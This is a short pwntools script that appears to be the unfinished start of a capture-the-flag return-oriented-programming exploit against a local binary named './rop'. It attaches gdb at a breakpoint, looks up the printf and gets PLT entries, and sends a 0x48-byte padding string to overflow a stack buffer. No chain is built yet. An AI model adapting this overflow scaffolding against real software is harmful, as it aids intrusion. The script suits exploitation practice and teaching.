from pwn import *
context(log_level="debug")

p = process("./rop")
elf = ELF("./rop")
gdb.attach(p,"b*0x400680\nc")
printf_plt = elf.symbols["printf"]
gets_plt = elf.symbols["gets"]
p.sendline("a"*0x48)
p.interactive()